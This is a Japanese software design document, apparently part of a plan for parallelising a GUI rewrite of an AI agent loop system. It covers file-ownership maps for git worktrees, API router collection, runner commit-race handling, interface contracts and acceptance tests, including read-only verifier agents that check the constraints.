各ワークストリームを**ファイル所有が重ならない単位**に切り、別 git worktree で並走させる。所有マップ(相対パス):

| ワークストリーム | 排他所有するパス | 共有(読むだけ・書き換え禁止) |
|---|---|---|
| P0 | `webapp/api/`・`webapp/schemas.py`・`webapp/legacy.py`・`webapp/main.py`・`webapp/auth.py` | `runner.py`・`loopdb.py`(import のみ。改造禁止) |
| 0.5 共有面 | `web/lib/`・`web/components/ui/`・`web/app/layout.tsx`・`web/tailwind.config.ts`・`web/package.json` | OpenAPI 出力 |
| P1-A 一覧 | `web/app/runs/page.tsx`・`web/components/runs/list/` | `web/lib/*`(固定済) |
| P1-B 詳細+判断 | `web/app/runs/[id]/`・`web/components/runs/detail/`・`web/components/judgment/` | `web/lib/*` |
| P1-C TODO | `web/app/tasks/`・`web/components/tasks/` | `web/lib/*` |
| P2 SSE | `web/app/monitor/`・`web/components/monitor/`・`web/lib/sse.ts` | `web/lib/*` |
| P3 ダッシュボード | `web/app/dashboard/`・`web/components/charts/`・`webapp/api/stats.py` | `stats.py`・`queries/*.sql`(読むだけ) |
| P4 認証 | `webapp/auth.py`(P0から引き継ぎ)・`web/app/(auth)/`・`web/lib/auth.ts` | — |
| T 並列化 | `runner.py`(`cmd_run`周辺)・`loop.toml` | — |

**衝突の主因は2点**で、これを所有マップで物理的に避ける:

1. **`web/lib/`(型 / API クライアント)** — 全フロントが import する。だから 0.5 ゲートで先に凍結し、P1 以降は **read-only**。フロント各人がここを書き換えないことが衝突ゼロの条件。
2. **`webapp/main.py`(router 登録)** — 全 API ワークストリームが `include_router` を足したくなる中心。P0 で `app.include_router(...)` を一度確定させ、P3/P4 が増やす router は**各自のファイルで `APIRouter` を定義し、登録1行を P0 オーナーがまとめて入れる**(または `webapp/api/__init__.py` の自動収集で main.py を触らせない)。

**推奨(決定): `webapp/api/__init__.py` でサブルータを自動収集**し、新エンドポイント追加で `main.py` を編集させない。これで P3(stats)・P4(auth)が main.py で衝突しない。

```python
# webapp/api/__init__.py — 各 module の `router` を集める。新規 module 追加で main.py を触らない
api_router = APIRouter(prefix="/api")
for mod in (runs, tasks, dispatch, monitor, stats):  # 追加はこの1行だけ
    api_router.include_router(mod.router)
```

worktree 運用(`branch-create` スキルの規約に従い、`--no-track` で main 起点・初回 push で upstream 紐付け):

```sh
# 各ワークストリームを別 worktree に隔離(.loop-worktrees/ は既に gitignore 済)
git worktree add --no-track .loop-worktrees/p1-detail -b feat/web-run-detail
git worktree add --no-track .loop-worktrees/p2-sse    -b feat/web-sse-monitor
# ...各ワークストリームを別ディレクトリ・別エージェントで並走
```

統合順序(決定): `P0 → 0.5 → (P1-A,B,C / P2 / P3 / P4 を完成順に逐次 merge)`。フロント同士は所有が重ならないので merge 競合はほぼ `web/app/layout.tsx` のナビ追記のみ。**ナビは 0.5 で全ページ分のリンクを先に置いておく**(リンク先が 404 でも可)ことで、後続 merge が layout を触らずに済む。

### 8.5 別トラック T: runner 並列化(GUI 非依存・最重要ボトルネック)

README/`cmd_run` のとおり、ループのスケール限界は GUI ではなく **`data/.run.lock` の `os.O_EXCL` による直列実行**。これは GUI 刷新と**完全に独立**したトラックで、刷新の依存グラフをブロックしない。ただし並列化を入れる際の制約を**ここで明示**しておく(GUI 側が前提にするため)。

- **commit race**: `auto_commit(runner.DATA, ...)` と `write_task`→`auto_commit` が `data/` の同一 git repo に commit する。並列 run は `.git/index.lock` 競合を起こす。回避: data/ への書き込みを**単一のコミットワーカー(キュー)経由**に直列化するか、run ごとに worktree を分け最後に rebase/merge する。GUI からの TODO 編集(`POST /api/tasks/*`)も同じキューに乗せる。
- **lock の意味変更**: 現 `.run.lock` は「単一 run の atomic claim 兼ステータス」。並列化後はこれが「run ごとのステータスファイル(`runs/<id>/status.json` 等)」に分裂する。**SSE(§5/P2)は最初から `run_id` をキーに複数ステータスを読む設計**にしておくこと(§8.1.3)。これが「T が後から入っても P2 を改修しない」ための前提。
- **GUI 側の不変条件**: T が未着手(直列)の間も、SSE/監視 UI は「同時 run 数 = 0 or 1」を正しく扱える(配列長1)。よって T と GUI のリリースは独立してよい。

T は GUI とは別の loop 目標契約(`data/tasks/*.md`)に切り出し、**GUI 刷新と同時並行で**進めてよい(依存ゼロ)。

### 8.6 インターフェース契約 = 並列化を解禁する鍵 / 受け入れ基準

並列化の鍵は「契約を最初に確定し、以後それを変えない」こと。確定すべき契約物は3つ(正本の所在も固定):

1. **OpenAPI**(正本 = `webapp/schemas.py`、出力 = `/openapi.json`)。
2. **SSE イベント形**(正本 = §5 のイベント定義。`event:` 名 + `data:` の JSON 形を P0 で凍結)。最低限 `run.phase`(`{run_id, phase, started_at, elapsed}`)・`run.event`(role別 transcript 行)・`run.done` の3種を P0 で固定。
3. **認証境界**(正本 = §6。`AuthMiddleware` のインターフェースと「dispatch/生成は localhost/強認可のみ」という不変条件)。

**受け入れ基準(各ワークストリーム共通の置き方)**:

- **契約適合**: フロントの fetch/SSE 消費は**生成された `web/lib/types.ts` の型を通る**(`any` 禁止)。型が通らない = 契約違反として CI で落とす。
- **二重経路一致(P1まで)**: 同じ run/タスクを Next 経路と `/legacy/*` 経路で開いて**契約ファイル上の結果が一致**する(判断保存・TODO 編集)。
- **契約ファイルが正本**: 全ての書き込み受け入れテストは **`runs/<id>.md` / `data/tasks/<id>.md` の差分 + `git log`** で検証する。`loop.db` の状態は受け入れ判定に使わない(`just reindex` で再生成できるため非正本)。
- **read-only 面の証明**: 監視・ダッシュボード・詳細表示の API は `GET` のみで副作用を持たない(`reindex` の呼び出しはインデックス再生成であり契約ファイルを書き換えない)ことをテストで固定。

### 8.7 各ワークストリームを loop 自身に実装させる場合の注意

各ワークストリームは `data/tasks/<id>.md` の目標契約に落として loop で実装させられる(`task-author` スキル → `runner.py run`)。中心思想を破らないための具体的注意:

- **repo 指定必須**: 全タスクの front-matter `repo:` を **engine repo(このリポジトリ)** に明示する(README どおり repo の自動推定はしない)。`web/` も `webapp/` も engine 側。`data/` を対象にしてはいけない(`data/` は契約データ repo であってコード実装対象でない)。
- **verify コマンドの置き方**(`verify:` front-matter = 決定論テスト):
  - フロント: `cd web && npm run build && npm run typecheck`(+ あれば `npm test`)。**型生成の整合**を verify に含める(`openapi-typescript` 再生成で差分が出ないこと)。
  - バックエンド: `uv run -m pytest webapp/tests/...` 等、API レスポンスが `schemas.py` に適合し副作用が契約ファイルに正しく出ることを確認するテスト。
  - SSE/監視: 副作用なし(`GET` のみ)を assert するテストを verify に含め、**監視 UI が誤って書き込み経路を持たない**ことを機械的に保証。
- **read-only 役の活用**: Explorer/Verifier は `--disallowedTools` で変更系禁止(`WRITE_TOOLS = Write/Edit/MultiEdit/NotebookEdit/Bash`)が効く。**「判断を生成しない」制約の番人**として Verifier に「この PR が `write_judgment` 前後に AI 生成テキストを差し込んでいないか」「監視/ダッシュボード API が推奨文を返していないか」を独立検証させる。これは種類B(判断)ではなく種類A(制約適合の機械的検証)なので自動化してよい。
- **worktree 衝突回避**: §8.4 の所有マップを各タスクの `constraints:` に書き、エージェントが他ワークストリームのファイルを触らないよう制約する(例: 「`web/lib/` は read-only。変更は 0.5 共有面タスクのみ」)。
- **`max_attempts`**: フロントのビルド系タスクは冪等なので既定リトライ可。`auto_commit`(data/)を伴うタスクを並列で走らせない(§8.5 の commit race。T 完了までは GUI 実装タスクも直列 run のまま回す)。

#### 中心思想に抵触しうる箇所と回避(明示)

- **「GUI は判断を生成・要約・推奨・自動入力しない」** — P1 判断フォームの prefill は `runner.parse_judgment` の既存値の復元のみ。AI サジェスト/例文/オートコンプリートを**禁止項目として受け入れ基準に明記**(§8.6)。P3 ダッシュボードは数値の事実提示のみで「改善すべき」等の推奨文を返さない。
- **「file-based contract が単一の真実」** — 全書き込みは `runner.write_judgment`/`write_task`+`auto_commit` 経由で契約ファイルへ。Next/FastAPI は独自ストアを持たない。受け入れは契約ファイル差分で判定(§8.6)。
- **「loop.db は使い捨て」** — ダッシュボード/一覧は `loop.db`/DuckDB を**読みのレンズ**として使うが、`just reindex` で全再生成できる状態のみ表示し、集計結果を独自永続化しない。authoritative 参照を避ける。

### 8.8 まとめ(決定事項)

- **P0 を UI 非改造の純 API/SSE/認証土台フェーズとして独立**させ、不変条件(Jinja が壊れない)を自明に保証する。
- **0.5 共有面ゲート(schemas→types→shadcn基盤)を直列で先に凍結**し、ここを read-only 化してフロント6ワークストリームを扇形に並列解禁する。
- **契約物3点(OpenAPI / SSEイベント形 / 認証境界)を P0 で凍結**=並列化の鍵。型は OpenAPI→TS の一方向生成。
- **worktree はファイル所有が重ならない単位**で切り、`webapp/api/` のサブルータ自動収集で `main.py` 衝突を消す。
- **runner 並列化(T)は GUI と独立トラック**。commit race / lock 意味変更を GUI(特に P2 SSE)が最初から複数 run 前提で吸収しておく。
- フェーズ番号は**出荷順序**であり実装着手順序ではない。契約が凍れば実装は同時並行。
